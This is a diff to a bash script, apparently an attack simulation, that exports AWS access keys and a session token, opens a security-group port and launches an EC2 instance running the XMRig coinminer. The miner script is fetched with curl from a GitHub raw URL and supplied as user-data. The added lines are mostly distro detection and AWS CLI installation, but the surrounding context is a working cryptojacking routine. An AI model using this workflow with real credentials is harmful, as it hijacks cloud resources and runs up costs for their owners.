@@ -55,9 +55,59 @@ yellow_output "Exporting AWS Keys/Tokens..."
 export AWS_ACCESS_KEY_ID=$ACCESS_KEY_ID
 export AWS_SECRET_ACCESS_KEY=$SECRET_ACCESS_KEY
 export AWS_SESSION_TOKEN=$TOKEN
+export AWS_DEFAULT_REGION=$REGION
 
 
 #aws ec2 describe-instances
+
+# Install AWSCLI if it isn't already installed
+function awscli_check () {
+    if ! [[ -x "$(which aws)" ]]; then
+        printf "\n${Yellow}INFO:  Installing AWSCLI utility... ${Color_Off}\n"
+        if [[ $1 = 'apt' ]]; then
+            sudo apt-get update && sudo apt-get install -y awscli
+        elif [[ $1 = 'yum' ]]; then
+            sudo yum -y install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
+            sudo yum install -y awscli
+        elif [[ $1 = 'zypper' ]]; then
+            sudo zypper install -y awscli
+        elif [[ $1 = 'dnf' ]]; then
+            sudo dnf install -y awscli
+        else
+            printf "\n${Red}ERROR:  Unsupported package manager: $1.${Color_Off}\n"
+        fi
+    else
+        printf "\n${Yellow}INFO:  AWSCLI is already installed.${Color_Off}\n"
+    fi
+}
+
+# Detect if the Linux Platform uses RPM/DEB packages and the correct Package Manager to use
+function detect_pkg_mgr_info () {
+    if (cat /etc/*release |grep 'ID=ubuntu' || cat /etc/*release |grep 'ID=debian'); then
+        FILE_EXTENSION='.deb'
+        PACKAGE_MANAGER='apt'
+        AGENT_INSTALL_SYNTAX='dpkg -i'
+    elif (cat /etc/*release |grep 'ID="rhel"' || cat /etc/*release |grep 'ID="amzn"' || cat /etc/*release |grep 'ID="centos"' || cat /etc/*release |grep 'ID="ol"' || cat /etc/*release |grep 'ID="scientific"' || cat /etc/*release |grep 'ID="rocky"' || cat /etc/*release |grep 'ID="almalinux"'); then
+        FILE_EXTENSION='.rpm'
+        PACKAGE_MANAGER='yum'
+        AGENT_INSTALL_SYNTAX='rpm -i --nodigest'
+    elif (cat /etc/*release |grep 'ID="sles"'); then
+        FILE_EXTENSION='.rpm'
+        PACKAGE_MANAGER='zypper'
+        AGENT_INSTALL_SYNTAX='rpm -i --nodigest'
+    elif (cat /etc/*release |grep 'ID="fedora"' || cat /etc/*release |grep 'ID=fedora'); then
+        FILE_EXTENSION='.rpm'
+        PACKAGE_MANAGER='dnf'
+        AGENT_INSTALL_SYNTAX='rpm -i --nodigest'
+    else
+        printf "\n${Red}ERROR:  Unknown Release ID: $1 ${Color_Off}\n"
+        cat /etc/*release
+        echo ""
+    fi
+}
+
+detect_pkg_mgr_info
+awscli_check $PACKAGE_MANAGER
 
 # Use awscli to create a new EC2 instances to run a coinminer
 yellow_output "Creating new EC2 instance to run XMRig (coinminer)..."
@@ -74,8 +124,9 @@ aws ec2 authorize-security-group-ingress --group-id $SG_ID --protocol tcp --port
 curl -sLO https://raw.githubusercontent.com/s1-howie/s1-wiz/main/xmrig.sh
 
 ec2_run_instances=$(aws ec2 run-instances --image-id $IMAGE_ID --count 1 --instance-type $INSTANCE_TYPE \
---key-name $KEY_NAME --security-group-ids $SG_ID --subnet-id $SUBNET_ID --tag-specifications $TAGS \
+--key-name $KEY_NAME --security-group-ids $SG_ID --subnet-id $SUBNET_ID \
 --iam-instance-profile "Arn=${INSTANCE_PROFILE_ARN}" --user-data file://xmrig.sh)  
+#--tag-specifications $TAGS \
   
   
 # #--user-data file://$STARTUP_SCRIPT_PATH 
